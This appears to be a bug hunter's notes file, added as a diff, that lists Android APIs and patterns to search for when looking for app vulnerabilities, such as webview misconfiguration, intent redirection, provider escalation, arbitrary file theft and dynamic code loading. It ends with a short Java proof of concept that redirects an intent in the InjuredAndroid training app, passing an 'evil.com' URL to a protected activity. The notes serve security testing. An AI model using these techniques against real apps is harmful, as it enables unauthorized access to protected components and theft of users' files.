@@ -1,0 +1,102 @@
+A list of usefull material to look(grep) for when engaging with android apps
+
+InsufficientUrlValidation
+    goal is the ability to load arbitray urls in apps webview
+    could be via deeepliks,intentredirection or wareva
+
+exposing java objects to javascript
+    $Webview.addJavascriptInterface(obj,name)
+    @JavascriptInterface
+    mostly chained with ability to load arbitrary uris in webview or similar
+
+webview
+    setAllowUniversalAccessFromFileURLs()
+    setAllowFileAccessFromFileURLs()
+    setJavaScriptEnabled(true)
+    loadDataWithBaseURL() then calls loadUrl()
+
+Intent redirection
+    getParcelableExtra("key") - Activity should be exported or an implicti intent or broadcast receiver
+    Activity takes intent as extra and passes it to startActivity()
+    this behaviour allows access to protected app components
+
+Escalation of intent redirection via content providers
+    provider must not be exported
+    provider must have android:grantUriPermissions="true"
+
+Escalation of intent redirection via file providers
+    look at providepaths listed in manifestfile
+    the @xml/paths file shows which directories or paths can be accessed
+
+Escalation of intent redirection via webview
+    intent.parseUri() - could also be exploited via deeplinks or ability to open arbitrary uris from exported activities
+    this version is rare but worth giving a shot
+    if intent.setComponent(null);, intent.setSelector(null); then march forward
+
+Theft of Arbitrary Files
+    Uri.fromFile() -
+    look for instances where app lets user choose data (implicit intent) and then wants to send that data to server for processing
+    the app will need to copy data from local file to file in sdcard then read that file and send to server.
+    if you can control the fileuri then you can steal arbitrary file when the app copys file to sdcard
+    used in tandem with Environment.getExternalStorageDirectory()?
+
+Interception of implicit intents
+    sendBroadcast()
+    look for where you can resgister a receiver or an action that matches an action in vicitim app
+    from manifestfile
+
+Arbitrary Command execution via third party package contexts
+    getinstalledpackages() - returns a list of installed packages
+    goal is to find weak verification of packagenameprefixes
+
+    creatpackagecontext() - creates a new context inheriting its resources and classloaders
+    goal is to find whether you can control the packagename passed to above function
+
+RCE via dynamic code loading
+    normally used to escalate a vuln where attacker can overwrite arbitrary files
+    most apps use playcore to help with dynamic loading
+    SplitInstallManager - class used to download and install feature modules
+    deferredInstall() - background install
+    startInstall() - methods used to identify if play core is being used by victim app.
+    getLastPathSegment() - if used to dynamically get the filename froma controlled uri or provider.
+    levergaged so that one can overwrite or write new files in lib directory
+
+applink hijacking
+    witout sts
+    setTextSelecttable(false)
+    setMovementMethod(null)
+    isSuggestionsEnabled()
+
+
+MISC checks
+    sendBroadcast()
+    startActivity()
+    onActivityResult()
+    registerReceiver
+    equals()
+    endswith()
+    startswith()
+    contains()
+    onReceive() - broadcastreceiver
+    startService()
+    getStringExtra() - if found on exported activity then shows what the intent expects via "key"
+    getQueryParameter() - entry point for attackers to webview if not sanitized
+
+
+injured android intent redirection poc
+
+b3nac.injuredandroid.ExportedProtectedIntent - intent.getParcelableExtra("access_protected_component")
+getStringExtra("totally_secure")
+
+b3nac.injuredandroid.FlagTwelveProtectedActivity
+
+Intent extra = new Intent();
+extra.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.FlagTwelveProtectedActivity");
+extra.putExtra("totally_secure", "http://evil.com/");
+
+Intent intent = new Intent();
+intent.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.ExportedProtectedIntent");
+intent.putExtra("access_protected_component", extra);
+startActivity(intent);
+
+kujituma
